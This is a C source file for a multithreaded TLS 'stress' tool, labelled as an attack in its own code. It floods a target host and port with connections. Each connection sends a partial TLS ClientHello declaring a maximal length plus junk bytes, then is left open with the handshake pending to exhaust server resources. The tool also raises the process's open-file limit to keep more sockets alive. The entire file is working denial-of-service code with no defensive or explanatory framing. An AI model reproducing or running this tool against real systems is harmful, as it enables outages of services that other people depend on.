// gcc -o ssl_stress ssl_stress.c -lssl -lcrypto -lpthread

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <stdatomic.h>
#include <stddef.h>   // For size_t
#include <sys/resource.h>  // For setrlimit

#define DESIRED_NOFILE 1000000000000

#define BANNER "\n\033[1;31m" \
"                            ,-.\n" \
"       ___,---.__          /'|`\          __,---,___\n" \
"    ,-'    \\`    `-.____,-'  |  `-.____,-'    //    `-.\n" \
"  ,'        |           ~'\\     /`~           |        `.\n" \
" /      ___//              `. ,'          ,  , \\___      \n" \
"|    ,-'   `-.__   _         |        ,    __,-'   `-.    |\n" \
"|   /          /\\_  `   .    |    ,      _/\\          \\   |\n" \
"\\  |           \\ \\`-.___ \\   |   / ___,-'/ /           |  /\\\n" \
" \\  \\           | `._   `\\\\  |  //'   _,' |           /  /\\\n" \
"  `-.\\         /'  _ `---'' , . ``---' _  `\\         /,-'\n" \
"     ``       /     \\    ,='/ \\`=.    /     \\       ''\n" \
"\033[0m                * g a l i a n    b e a s t *\n\n"

atomic_long total_connections = ATOMIC_VAR_INIT(0);
atomic_long pending_handshakes = ATOMIC_VAR_INIT(0);
struct sockaddr_in target_addr;
const char *g_target_host;
int g_thread_count;

typedef struct {
    int thread_id;
    int max_attempts;  // Increased to 5000 per thread below
} ThreadConfig;

void resolve_target(const char *host, int port) {
    struct hostent *he = gethostbyname(host);
    if (!he) {
        fprintf(stderr, " - Failed to resolve %s\n", host);
        exit(EXIT_FAILURE);
    }
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    memcpy(&target_addr.sin_addr, he->h_addr_list[0], he->h_length);
}

void print_stats() {
    printf("\r\033[34m[+] Connections: %ld | Pending Handshakes: %ld | Threads: %d\033[0m",
           atomic_load(&total_connections), atomic_load(&pending_handshakes), g_thread_count);
    fflush(stdout);
}

void* attack_thread(void* arg) {
    ThreadConfig *config = (ThreadConfig*)arg;
    
    // Define a partial TLS ClientHello payload.
    // The record header: type 0x16 (Handshake), TLS version 0x03,0x01 and a length of 0xFFFF.
    // The handshake header: type 0x01 (ClientHello) with a declared handshake length of 0x00FFFF.
    unsigned char partialClientHello[] = {
        0x16, 0x03, 0x01, 0xFF, 0xFF,  // TLS record header: handshake, TLS1.0, length = 65535
        0x01,                         // Handshake type: ClientHello
        0x00, 0xFF, 0xFF              // Handshake header: declared length = 65535 bytes
    };

    // Define a secondary payload chunk to further stress the server.
    // This junk data is sent immediately after the initial header.
    unsigned char junkData[4096];
    memset(junkData, 0x00, sizeof(junkData));

    for (int i = 0; i < config->max_attempts; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
            continue;
        
        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
            // Send the partial ClientHello header.
            ssize_t sent = send(sock, partialClientHello, sizeof(partialClientHello), 0);
            // Immediately follow with additional junk data.
            ssize_t junkSent = send(sock, junkData, sizeof(junkData), 0);
            if (sent == sizeof(partialClientHello) && junkSent == sizeof(junkData)) {
                atomic_fetch_add(&pending_handshakes, 1);
                // Leave connection open with handshake pending.
            } else {
                close(sock);
            }
            atomic_fetch_add(&total_connections, 1);
        } else {
            close(sock);
        }
        
        if (i % 10 == 0)
            print_stats();
    }
    
    free(config);
    return NULL;
}

int main(int argc, char *argv[]) {
    printf(BANNER);
    
    if (argc != 4) {
        printf("Usage: %s <IP/HOST> <PORT> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    // Attempt to raise the open file descriptor limit.
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        unsigned long target = DESIRED_NOFILE;
        if (target > rl.rlim_max)
            target = rl.rlim_max;
        while (target > rl.rlim_cur) {
            rl.rlim_cur = target;
            if (setrlimit(RLIMIT_NOFILE, &rl) == 0) {
                printf("[*] Open file descriptor limit set to %lu\n", target);
                break;
            } else {
                perror("setrlimit failed");
                target /= 2;
            }
        }
    } else {
        perror("getrlimit failed");
    }
    
    g_target_host = argv[1];
    int target_port = atoi(argv[2]);
    g_thread_count = atoi(argv[3]);
    
    resolve_target(g_target_host, target_port);
    
    pthread_t *threads = malloc(g_thread_count * sizeof(pthread_t));
    if (threads == NULL) {
        perror("Failed to allocate memory for threads");
        return EXIT_FAILURE;
    }
    
    for (int i = 0; i < g_thread_count; i++) {
        ThreadConfig *config = malloc(sizeof(ThreadConfig));
        if (config == NULL) {
            perror("Failed to allocate memory for thread configuration");
            continue;
        }
        config->thread_id = i;
        config->max_attempts = 50000;  // Increased connection attempts per thread
        
        if (pthread_create(&threads[i], NULL, attack_thread, config) != 0) {
            perror("Thread creation failed");
            free(config);
        }
    }
    
    while (atomic_load(&total_connections) < (g_thread_count * 50000)) {
        print_stats();
        sleep(1);
    }
    
    for (int i = 0; i < g_thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n\033[32m[+] Attack complete: all connections are pending!\033[0m\n");
    free(threads);
    return EXIT_SUCCESS;
}
